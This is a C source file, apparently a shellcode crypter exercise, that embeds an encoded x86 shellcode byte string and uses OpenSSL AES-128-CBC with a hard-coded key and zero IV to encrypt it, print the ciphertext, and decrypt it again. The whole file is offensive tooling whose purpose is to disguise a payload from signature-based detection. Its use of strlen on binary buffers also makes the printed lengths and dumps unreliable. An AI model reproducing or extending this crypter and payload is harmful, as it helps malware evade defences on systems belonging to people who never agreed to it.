#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
 
int main( )
{
        /* Set Key */
        unsigned char key[16];
        strcpy((char *) key,"012345678912345");
	
        /* Shellcode to encrypt */
	unsigned char shellcode[] = \
"\xb8\xea\x49\x69\xec\xda\xd7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x0c\x31\x43\x13\x83\xeb\xfc\x03\x43\xe5\xab\x9c\x86\xf2\x73\xc6\x05\x62\xec\xd5\xca\xe3\x0b\x4d\x22\x80\xbb\x8e\x54\x49\x5e\xe6\xca\x1c\x7d\xaa\xfa\x14\x82\x4b\xfb\x07\xe0\x22\x95\x78\x80\xd5\x1d\xe3\x48\x41\x8d\x62\xa9\xa0\xb1";
	
        /* Print original shellcode for verification */
        printf("[*] Original Shellcode: \n");
        for (int i = 0; i < strlen(shellcode); i++) {

                printf("\\x%x", shellcode[i]);
        }
        printf("\n[*] Original Shellcode Length:  %d\n", strlen(shellcode));

	/* Init vector */
	unsigned char iv[AES_BLOCK_SIZE];
	memset(iv, 0x00, AES_BLOCK_SIZE);
	
	/* Buffers for Encryption and Decryption */
	unsigned char ciphertext[sizeof(shellcode)];
	unsigned char dec_out[sizeof(shellcode)];
	
	/* AES-128 bit CBC Encryption */
	
        printf("\n[*] Encrypting Shellcode with key: %s \n", key);

        AES_KEY enc_key, dec_key;
	AES_set_encrypt_key(key, sizeof(key)*8, &enc_key);
	AES_cbc_encrypt(shellcode, ciphertext, sizeof(shellcode), &enc_key, iv, AES_ENCRYPT);

        printf("[*] Encrypted Shellcode:\n");
    
        for (int i = 0; i < strlen(ciphertext); i++) {
    
                printf("\\x%x", ciphertext[i]);
        }
        printf("\n[*] Encrypted Shellcode Length:  %d\n", strlen(ciphertext));

	/* AES-128 bit CBC Decryption */
	memset(iv, 0x00, AES_BLOCK_SIZE); 
	AES_set_decrypt_key(key, sizeof(key)*8, &dec_key); // Size of key is in bits
	AES_cbc_encrypt(ciphertext, dec_out, sizeof(shellcode), &dec_key, iv, AES_DECRYPT);
	
	printf("\n[*] Decrypting Shellcode... \n");
        printf("[*] Recovered Original Shellcode: \n");

        for (int i = 0; i < strlen(dec_out); i++) {
 
                printf("\\x%x", dec_out[i]);

        }  
		
        printf("\n[*] Done \n");	

        return 0;
}
 
